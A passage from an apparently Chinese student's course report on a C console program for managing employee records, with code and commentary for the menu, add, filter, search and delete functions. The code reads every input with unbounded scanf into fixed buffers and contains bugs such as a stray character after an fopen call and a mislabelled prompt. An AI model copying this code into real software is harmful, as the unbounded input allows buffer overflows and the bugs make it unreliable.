回显实际上存在问题，如果在输入过程中输入错误，想要把已经输入的数据删除的话，是无法完成的，因为使用的是<strong>getchar（）</strong>，<em>delete</em>实际上也是一种字符，这里是一个隐患。由于影响并不严重，不会影响到我的演示，就没有对这个问题进行修复。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 管理员账号设置后无法更改，这点有点反人类，做出更改实际不难，但是这次实训三人小组实际上就我一个人负责，我真的不想再给自己找活干了。</p><h6 id="3-2-4操作页面"><a href="#3-2-4操作页面" class="headerlink" title="3.2.4操作页面"></a>3.2.4操作页面</h6><pre class="line-numbers language-none"><code class="language-none">int Hollow(void)&#x2F;&#x2F;管理员页面，在程序中会反复调用；&#123;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                   《职工信息管理系统》                  ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                       管理员页面！                      ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.新建职工信息                 2.浏览职工信息         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   3.查询职工信息                 4.删除职工信息         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   5.变更职工信息                 6.退出程序             ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><center> 单纯的一个操作页面 </center>###### 3.2.5新建职工信息<pre class="line-numbers language-none"><code class="language-none">void f_1(struct workers *workers)&#x2F;&#x2F;以尾加法插入新的数据，并写入text.dat二进制文件中；&#123;    struct workers *p;    &#x2F;&#x2F;p是个指向结构体指针后面需要用到；    p &#x3D; (struct workers *)malloc(sizeof(struct workers));    &#x2F;&#x2F;对指针p分配大小；    p&#x3D;workers;    printf(&quot;请输入员工号:&quot;);    scanf(&quot;%s&quot;, p-&gt;jobNo);    printf(&quot;请输入姓名:&quot;);    scanf(&quot;%s&quot;, p-&gt;name);    printf(&quot;请输入性别:&quot;);    scanf(&quot;%s&quot;, p-&gt;sex);    printf(&quot;请输入所担任职务:&quot;);    scanf(&quot;%s&quot;, p-&gt;position);    printf(&quot;请输入年龄：&quot;);    scanf(&quot;%s&quot;,p-&gt;year);    printf(&quot;请输入工资:&quot;);    scanf(&quot;%s&quot;, p-&gt;salary);    printf(&quot;请输入家庭住址：&quot;);    scanf(&quot;%s&quot;, p-&gt;addr);    printf(&quot;请输入员工联系方式：&quot;);    scanf(&quot;%s&quot;, p-&gt;tel);    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;ab+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);        &#x2F;&#x2F;这段程序是结束函数块的，如果没有这段代码后面内容还会继续输出。    &#125;    fwrite(workers,sizeof(struct workers),1,fp);    &#x2F;&#x2F;将数据存入函数中；    fclose(fp);    char ch[10];    NUM++;    sprintf(ch,&quot;%d&quot;,&amp;NUM);    FILE *fp1;    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;w+&quot;);    itoa(NUM,ch, 10);    &#x2F;&#x2F;一个没学过的函数，把整形数转化成字符型；    fputs(ch,fp1);    fclose(fp1);    system(&quot;cls&quot;);    &#x2F;*    使用外部变量NUM，在使用者使用程序时先行为，NUM赋值；    *&#x2F;    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>实现增添的一个程序块，主要功能**以追加的形式将数据存入二进制文件，并且将从文本文件中读取的NUM值自增，并将NUM重新存入文本文件中。**解释说明：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 由于每个程序块没有返回值的需要，函数就使用了没有返回值的void类型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2  **FILE** * **fp=fopen("text.dat","ab+");**以追加方式打开text.dat这个二进制文件 ，再使用**fwrite(workers,sizeof(struct workers),1,fp);**语句将一个大小为sizeof(struct workers)的结构体变量workers写入二进制文件中。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3 我在这里使用了itoa（）这个函数,函数原型为> char *itoa( int value, char *string,int radix)***value***：欲转换的数据。***string***：目标字符串的地址。***radix***： 转换后的进制数，可以是10进制、16进制等。同刚刚使用的atoi函数itoa函数也可以用格式化写函数fprintf（）解决，终究还是多此一举了。<h5 id="3-2-6浏览（筛选）职工信息："><a href="#3-2-6浏览（筛选）职工信息：" class="headerlink" title="3.2.6浏览（筛选）职工信息："></a>3.2.6浏览（筛选）职工信息：</h5><pre class="line-numbers language-none"><code class="language-none">void f_2(struct workers *workers)&#x2F;&#x2F;浏览已经写入的数据；&#123;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.浏览全部信息                 2.按性别方式筛选       ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   3.按年龄方式筛选               4.按薪资筛选           ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    int n;    printf(&quot;请输入筛选的方式\n&quot;);    scanf(&quot;%d&quot;,&amp;n);    if(n&#x3D;&#x3D;1)    &#123;        system(&quot;cls&quot;);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        int i;        for (i&#x3D;0; i&lt;NUM; i++)        &#123;            p&#x3D;&amp;read[i];            if(read[i].jobNo)            &#123;                printf(&quot;——————————————————————————————\n&quot;);                printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                printf(&quot;—————————————————————————————\n&quot;);            &#125;        &#125;        system(&quot;pause&quot;);        system(&quot;cls&quot;);        Hollow();    &#125;    else if(n&#x3D;&#x3D;2)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工性别编号\n&quot;);        printf(&quot;1.男性    \t\t     2.女性\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(strcmp(read[i].sex,&quot;男&quot;)&#x3D;&#x3D;0)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(strcmp(read[i].sex,&quot;女&quot;)&#x3D;&#x3D;0)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;    else if(n&#x3D;&#x3D;3)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工薪资范围\n&quot;);        printf(&quot;1.青年    \t\t     2.壮年\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].year)&lt;30)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].year)&gt;30)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;    else if(n&#x3D;&#x3D;4)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工薪资范围\n&quot;);        printf(&quot;1.低薪    \t\t     2.中薪\t\t\t  3.高薪\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&lt;3000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&gt;&#x3D;3000&amp;&amp;atoi(read[i].salary)&lt;8000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if(k&#x3D;&#x3D;3)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&gt;&#x3D;8000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一模块一开始计划是只是浏览全部的员工信息，在后期的实训过程中，想到一个公司经常会有各种活动，需要对参与员工进行筛选，对其追加了根据年龄，工资与性别的筛选功能。<br>解释说明：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1  浏览只需要将全部数据从二进制文件中读取到结构体，通过for循环将所有的数据输出到屏幕中。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 关于筛选其实可以做的更好，比如说以年龄方式筛选的时候可以让使用者自己输入筛选的年龄范围，而不是我自己预先设定好的青年，壮年。同样按工资进行查询时同样也可以让使用者设置自己的筛选范围，这样可能对使用者更加友好。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3 第三点我曾经试图做出复合的筛选程序，只是感觉会过于复杂就没有做，大体的思路和现在一样，但是同时选择多种筛选方式，并对二进制文件中的数据进行复合筛选，找到需要的数据。</p><h5 id="3-2-7查找职工信息："><a href="#3-2-7查找职工信息：" class="headerlink" title="3.2.7查找职工信息："></a>3.2.7查找职工信息：</h5><pre class="line-numbers language-none"><code class="language-none">void f_3_1(struct workers *n)&#x2F;&#x2F;以员工号方式查询某个员工的信息。&#123;    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);a    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的职工号：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].jobNo,found)&#x3D;&#x3D;0)        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;void f_3(struct workers *n)&#x2F;&#x2F;以员工号方式查询某个员工的信息。&#123;    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的职工号：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].jobNo,found)&#x3D;&#x3D;0)        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);&#125;void f_3_2(struct workers *n)&#123;    &#x2F;&#x2F;以姓名方式查找员工；    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的姓名：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].name,found)&#x3D;&#x3D;0)            &#x2F;&#x2F;用found数组进行比较如果found数组和name相同则执行；        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)        &#x2F;&#x2F;当    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块对员工信息的查询功能包括两个方面，按员工号对员工信息进行查询和按照姓名方式进行查询，如果查询失败则输出没有该员工，返回操作页面。反之查询成功，输出查询到的数据。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 这一块代码主要利用<strong>strcmp（）函数</strong>比较输入的员工号或者员工姓名与从二进制文件中读取到结构体块中的数据对比，如果strcmp返回值为0则查询成功。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 这部分代码也有改进的地方由于各种原因没有实现。</p><h5 id="3-2-8删除员工信息"><a href="#3-2-8删除员工信息" class="headerlink" title="3.2.8删除员工信息"></a>3.2.8删除员工信息</h5><pre class="line-numbers language-none"><code class="language-none">int f_4(struct workers *workers)&#x2F;&#x2F;删除数据；&#123;    struct workers *p;    int j;    struct workers read[100];    char find[10];    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),NUM,fp);    printf(&quot;请输入要删除的职工号&quot;);    scanf(&quot;%s&quot;,find);    for(j&#x3D;0; j&lt;&#x3D;NUM; j++)    &#123;        if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)        &#123;            NUM--;            &#x2F;&#x2F;将num--这个操作，更改变量的大小，方便再次存入。            break;        &#125;    &#125;    if(NUM&lt;j)        &#x2F;&#x2F;如果没有提前结束，j的最终大小回是num+1;判断num是否及时结束。    &#123;        printf(&quot;该职工号不存在！&quot;);        system(&quot;pause&quot;);    &#125;    if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)    &#123;        for(j; j&lt;NUM; j++)        &#123;            strcpy(read[j].jobNo,read[j+1].jobNo);            strcpy(read[j].name,read[j+1].name);            strcpy(read[j].sex,read[j+1].sex);            strcpy(read[j].position,read[j+1].position);            strcpy(read[j].year,read[j+1].year);            strcpy(read[j].salary,read[j+1].salary);            strcpy(read[j].addr,read[j+1].addr);            strcpy(read[j].tel,read[j+1].tel);        &#125;    &#125;&#x2F;&#x2F;将read[j]进行移位，达到删除的目的；    fclose(fp);&#x2F;&#x2F;关闭文件    char ch[10];    &#x2F;&#x2F;定义一个    fp&#x3D;fopen(&quot;text.dat&quot;,&quot;wb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;删除失败！&quot;);        exit(EXIT_FAILURE);    &#125;    fwrite(read,sizeof(struct workers),NUM,fp);    fclose(fp);    FILE *fp1;    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;w+&quot;);    &#x2F;&#x2F;使用一个txt格式的文件作为辅助，进行数据量的计数。    itoa(NUM,ch, 10);    &#x2F;&#x2F;一个没学过的函数，把整形数转化成字符型；    fputs(ch,fp1);    fclose(fp1);    system(&quot;cls&quot;);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从二进制文件中将数据全部读取出来，将输入的员工号与已有数据中的员工号进行比对，当数据相同时删除该员工信息，并将全部信息重新写入文件中。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 